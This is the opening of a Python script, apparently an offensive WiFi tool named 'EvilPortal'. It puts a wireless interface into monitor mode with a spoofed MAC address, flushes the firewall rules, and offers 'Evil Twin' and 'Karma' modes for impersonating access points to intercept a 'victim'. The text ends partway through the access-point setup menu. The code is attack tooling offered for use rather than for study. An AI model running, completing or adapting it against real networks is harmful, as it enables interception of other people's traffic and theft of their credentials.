import os, re, random

tempFolder = '/tmp/evilportal'

def title():
    ret = '\n'
    ret += '███████╗██╗   ██╗██╗██╗     ██████╗  ██████╗ ██████╗ ████████╗ █████╗ ██╗     \n'
    ret += '██╔════╝██║   ██║██║██║     ██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝██╔══██╗██║     \n'
    ret += '█████╗  ██║   ██║██║██║     ██████╔╝██║   ██║██████╔╝   ██║   ███████║██║     \n'
    ret += '██╔══╝  ╚██╗ ██╔╝██║██║     ██╔═══╝ ██║   ██║██╔══██╗   ██║   ██╔══██║██║     \n'
    ret += '███████╗ ╚████╔╝ ██║███████╗██║     ╚██████╔╝██║  ██║   ██║   ██║  ██║███████╗\n'
    ret += '╚══════╝  ╚═══╝  ╚═╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝\n'
    ret += '                                                       By: hacefresko         \n'

    return ret

class networkInterfaces:

    # Here we find directories representing current network interfaces named after them
    netIntDir = '/sys/class/net'

    def __init__(self):
        self.interfaces = []
        self.num = 0

        for dirpath, interfaces, filenames in os.walk(self.netIntDir):
            for interface in interfaces:
                if re.match(r'wlan\d', interface):
                    self.num = self.num + 1

                    # Directory /sys/class/net/<interface>/type contains 
                    # the mode in which the interface is operating:
                    #   1   -> managed
                    #   803 -> monitor
                    #
                    f = open(self.netIntDir + '/' + interface + '/type', 'r')
                    if f.read() == '803\n':
                        self.interfaces.append({'i' : self.num, 'name' : interface, 'mode' : 'monitor'})
                    else:
                        self.interfaces.append({'i' : self.num, 'name' : interface, 'mode' : 'managed'})
                    f.close()

    def __repr__(self):
        ret = '\nNETWORK INTERFACES\n\n'

        for interface in self.interfaces:
            if interface['mode'] == 'monitor':
                ret += '[{}] -> {} ({})\n'.format(interface['i'], interface['name'], interface['mode'])
            else:
                ret += '[{}] -> {}\n'.format(interface['i'], interface['name'])

        return ret

    def genRandomMAC(self):
        mac = ''
        for i in range(6):
            mac += str(random.randint(0, 9)) + chr(random.randint(97, 102))
            if i != 5:
                mac += ':'
        return mac

    # Put selected interface in monitor mode + change it mac address
    def putInMonitor(self, i):
        if type(i) is not int:
            print('[x] Input value is not an integer!\n')
            return -1

        if i < 0 or i >= self.num:
            print('[x] Input value out of bounds!\n')
            return -1

        interface = self.interfaces[i]

        if interface['mode'] == 'monitor':
            print('[x] Selected interface is already in monitor mode!\n')
            return -1
        
        print('[-] Configuring network interface...')

        os.system('ifconfig ' + interface['name'] + ' down')
        os.system('iw ' + interface['name'] + ' set type monitor')
        os.system('ifconfig ' + interface['name'] + ' hw ether ' + self.genRandomMAC())
        os.system('ifconfig ' + interface['name'] + ' up')

        f = open(self.netIntDir + '/' + interface['name'] + '/type', 'r')
        if f.read() != '803\n':
            print('[x] Newtork interface couldn\'t be put in monitor mode!\n')
            f.close()
            return -1
        f.close()
        print('[+] Network interface configured succesfuly')
        
        return 0


print(title())

# Check for root priviledges
if os.getuid() != 0:
    print('[x] Please, run program as root!\n')
    quit()

networkInterfaces = networkInterfaces()

# Select network interface
if networkInterfaces.num == 0:
    print('[x] No network interface detected!\n')
    quit()

elif networkInterfaces.num == 1:
    if networkInterfaces.interfaces[0]['mode'] != 'monitor':
        if networkInterfaces.putInMonitor(0) != 0:
            quit()
    interface = networkInterfaces.interfaces[0]['name']

elif networkInterfaces.num > 1:
    ok = -1
    while ok != 0: 
        print(networkInterfaces)
        op = int(input('Select network interface > '))
        print()
        if op < 0 or op >= networkInterfaces.num: 
            print('[x] Input value out of bounds!')
        else:
            if networkInterfaces.interfaces[op]['mode'] != 'monitor':
                ok = networkInterfaces.putInMonitor(op)
            else:
                ok = 0
    
    interface = networkInterfaces.interfaces[op]['name']

print('[+] Network Interface in use: ' + interface)

# Create temp folder
try:
    os.makedirs(tempFolder)
except OSError:
    print('[-] Temporal directory ' + tempFolder + ' already exists')

# Flush iptables to avoid conflicts
print ('[-] Flushing iptables...')
os.system('iptables -F')
os.system('iptables -t nat -F')
print('[+] Iptables flushed')

op = -1
while op < 1 or op > 3:
    print('\nOPERATION MODE')
    print('[1] -> Create new acces point')
    print('[2] -> [Evil Twin] Intercept existing access point')
    print('[3] -> [Karma] Create acces point recogniced by victim')
    op = int(input(' > '))
    print()

    if op == 1:
        deauth = False
        essid = input('WiFi SSID > ')
        channel = input('Channel > ')

        encr = -1
        print('\nSecurity:')
        while encr < 1 or encr > 2:
            print('[1] -> Open')
            print('[2] -> WPA2')
            encr = int(input(' > '))
            if encr < 1 or encr > 2:
                print('[x] Input value out of bounds!\n')
            elif encr == 1:
                encryption = "OPEN"
            elif encr == 2:
                encryption = "WPA2"

